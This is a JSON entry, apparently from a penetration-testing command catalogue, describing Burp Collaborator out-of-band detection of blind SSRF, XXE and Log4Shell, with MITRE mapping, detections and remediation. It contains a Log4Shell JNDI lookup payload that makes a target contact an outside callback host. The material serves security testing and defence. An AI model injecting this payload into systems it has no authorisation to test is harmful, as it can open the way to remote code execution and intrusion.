[
  {
    "id": "burp-collaborator",
    "tool": "burpsuite",
    "category": "web_testing",
    "phase": 4,
    "os": [
      "linux",
      "windows",
      "macos"
    ],
    "command": "# Burp Collaborator: Generate payload\n# Insert: ${jndi:ldap://xyz.burpcollaborator.net/a}\n# Check Collaborator tab for callbacks",
    "name": "Blind Vulnerability Detection (Collaborator)",
    "description": "Uses out-of-band callbacks to detect blind vulnerabilities (SSRF, XXE, Log4Shell).",
    "arguments": {
      "Collaborator": "Burp's callback server"
    },
    "expected_output": "[+] DNS lookup received from target\n[+] HTTP request received \u2192 confirms blind SSRF",
    "use_case": "Detect blind vulnerabilities that don't show output in responses.",
    "prerequisites": [
      "Burp Suite Pro",
      "Target can make outbound requests"
    ],
    "mitre_mapping": [
      "T1190"
    ],
    "mitre_tactic": "Initial Access",
    "detections": [
      "Outbound DNS/HTTP to unusual domains"
    ],
    "remediation": [
      "Egress filtering",
      "Block unnecessary outbound"
    ],
    "common_mistakes": [
      "Target can't make outbound requests"
    ],
    "alternatives": [
      "interactsh (free alternative)",
      "webhook.site"
    ],
    "references": [
      "https://portswigger.net/burp/documentation/collaborator"
    ],
    "tags": [
      "blind",
      "oob",
      "collaborator",
      "ssrf",
      "detection"
    ]
  },
